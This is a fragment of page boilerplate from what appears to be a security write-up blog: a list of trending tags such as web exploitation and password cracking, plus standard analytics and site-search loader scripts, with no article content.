post-content"><div id="search-hints"><h4 class="text-muted mb-4">Trending Tags</h4><a class="post-tag" href="/tags/windows/">WINDOWS</a> <a class="post-tag" href="/tags/linux/">LINUX</a> <a class="post-tag" href="/tags/web-exploitation/">WEB EXPLOITATION</a> <a class="post-tag" href="/tags/payload/">PAYLOAD</a> <a class="post-tag" href="/tags/password-cracking/">PASSWORD CRACKING</a> <a class="post-tag" href="/tags/medium/">MEDIUM</a> <a class="post-tag" href="/tags/database-exploitation/">DATABASE EXPLOITATION</a> <a class="post-tag" href="/tags/active-directory-exploitation/">ACTIVE DIRECTORY EXPLOITATION</a> <a class="post-tag" href="/tags/cve/">CVE</a> <a class="post-tag" href="/tags/sudo-exploitation/">SUDO EXPLOITATION</a></div><div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div></div></div></div><div id="mask"></div><a id="back-to-top" href="#" class="btn btn-lg btn-box-shadow" role="button"> <i class="fas fa-angle-up"></i> </a> <!-- The GA snippet v2.0 https://github.com/cotes2020/jekyll-theme-chirpy © 2017-2019 Cotes Chung MIT License --> <script> (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){ (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o), m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m) })(window,document,'script','https://www.google-analytics.com/analytics.js','ga'); ga('create', '', 'auto'); ga('send', 'pageview'); </script> <!-- Jekyll Simple Search loader v2.0 https://github.com/cotes2020/jekyll-theme-chirpy © 2017-2019 Cotes Chung MIT License --> <script src="https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.7.3/dest/simple-jekyll-search.min.js"></script> <script> SimpleJekyllSearch({ searchInput: document.getElementById('search-input'), resultsContainer: document.getElementById('search-results'), json: '/assets/js/data/search.json', searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0"> <a href="https://pcw3r.github.io{url}">{title}</a><div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1"><div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>{categories}</div><div><i class="fa fa-tag fa-fw"></i>{tags}</div></div><p>{snippet}</p></div>', noResultsText: '<p class="mt-5">Oops! No result founds.</p>' }); </script>
